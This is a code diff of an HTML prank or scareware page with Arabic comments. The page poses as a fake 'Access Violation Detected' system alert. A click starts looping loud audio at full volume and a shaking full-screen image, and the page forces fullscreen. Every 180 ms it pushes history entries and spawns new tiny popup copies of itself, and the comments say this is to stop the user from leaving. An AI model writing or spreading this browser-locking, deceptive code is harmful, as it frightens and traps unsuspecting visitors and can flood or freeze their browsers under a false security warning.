@@ -3,14 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SYSTEM ERROR ☠️</title>
+    <title>⚠️ CRITICAL_HALT ⚠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        /* الصورة كبيرة، واضحة، وتهتز بجنون سواسوة */
-        #madImg { 
+        /* صورة المرأة: كبيرة، واضحة، ومهيأة للهبال سواسوة */
+        #ghost { 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
             object-fit: cover; z-index: 10; display: none;
+            will-change: transform;
         }
 
         /* الرسالة القديمة المريغلة سواسوة */
@@ -20,49 +21,51 @@
             flex-direction: column; justify-content: center; align-items: center;
             font-family: 'Courier New', monospace; color: #f00; text-align: center;
         }
-        .header { font-size: 35px; font-weight: bold; text-shadow: 0 0 10px #f00; }
+        .header { font-size: 32px; font-weight: bold; text-shadow: 0 0 15px #f00; }
         .blink { animation: b 0.1s infinite; }
         @keyframes b { 50% { opacity: 0; } }
-        .btn-start { 
+        .btn { 
             background: #f00; color: #000; border: none; padding: 25px 60px; 
-            font-weight: bold; font-size: 22px; cursor: pointer; margin-top: 30px;
+            font-weight: bold; font-size: 24px; cursor: pointer; margin-top: 40px;
         }
     </style>
 </head>
-<body onclick="launchOriginalMadness()">
+<body onclick="igniteTheMadness()">
 
     <div id="ui">
-        <h1 class="blink">☠️ SECURITY ALERT ☠️</h1>
-        <p>Unauthorized access detected.<br>Click to terminate process.</p>
-        <button class="btn-start">TERMINATE</button>
+        <h1 class="blink">☠️ SYSTEM_LOCK ☠️</h1>
+        <p>Access Violation Detected.<br>Tap to force terminate all processes.</p>
+        <button class="btn">TERMINATE</button>
     </div>
 
-    <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
+    <img id="ghost" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="audioBox">
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
+    <div id="vault">
+        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
+        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3"></audio>
+        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/dzonza.mp3"></audio>
     </div>
 
     <script>
         let aCtx, analyser, data;
-        const img = document.getElementById('madImg');
+        const img = document.getElementById('ghost');
 
-        function launchOriginalMadness() {
-            // 1. إطلاق الـ 6 أصوات الصاخبة سواسوة
-            document.querySelectorAll('.s').forEach(a => { a.volume = 1.0; a.play(); });
+        function igniteTheMadness() {
+            // 1. تشغيل الأصوات الثلاثة في وقت واحد سواسوة
+            document.querySelectorAll('.track').forEach(t => { 
+                t.volume = 1.0; 
+                t.play(); 
+            });
 
             document.getElementById('ui').style.display = 'none';
             img.style.display = 'block';
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            // 2. تفعيل الرعشة الهستيرية سواسوة
+            // 2. المحرك البصري (الرعشة مع الصوت) سواسوة
             if (!aCtx) {
                 aCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const source = aCtx.createMediaElementSource(document.querySelectorAll('.s')[0]); 
+                // نربط الحركة بـ "Chicken Screaming" لأن الـ Peak تاعه عالي سواسوة
+                const source = aCtx.createMediaElementSource(document.querySelectorAll('.track')[1]);
                 analyser = aCtx.createAnalyser();
                 analyser.fftSize = 64;
                 data = new Uint8Array(analyser.frequencyBinCount);
@@ -70,29 +73,30 @@
                 analyser.connect(aCtx.destination);
                 
                 if (aCtx.state === 'suspended') aCtx.resume();
-                requestAnimationFrame(jitterEngine);
+                renderLoop();
             }
 
-            // 3. نظام الحبس الرقمي سواسوة
+            // 3. نظام الحبس (منع الخروج) سواسوة
             setInterval(() => {
                 history.pushState(null, null, window.location.href);
                 window.open(window.location.href, '_blank', 'width=10,height=10');
-            }, 150);
+            }, 180);
         }
 
-        function jitterEngine() {
+        function renderLoop() {
             analyser.getByteFrequencyData(data);
-            let vol = data[0]; // نعتمد على الترددات الصاخبة سواسوة
+            let vol = data[0]; // التفاعل مع صرخة الدجاجة سواسوة
 
-            // 4. الرعشة المجنونة (خبط ودوران وتكبير) سواسوة
-            const intensity = (vol / 255) * 70; 
-            const x = (Math.random() - 0.5) * intensity * 4;
-            const y = (Math.random() - 0.5) * intensity * 4;
-            const r = (Math.random() - 0.5) * intensity;
-            const s = 1 + (vol / 255) * 0.5;
+            // 4. ميزة التخبيط (Jitter): اهتزاز هستيري سواسوة
+            const power = (vol / 255) * 85; 
+            const x = (Math.random() - 0.5) * power * 5;
+            const y = (Math.random() - 0.5) * power * 5;
+            const r = (Math.random() - 0.5) * power;
+            const s = 1 + (vol / 255) * 0.6; // التكبير العنيف
 
             img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${s})`;
-            requestAnimationFrame(jitterEngine);
+            
+            requestAnimationFrame(renderLoop);
         }
     </script>
 </body>
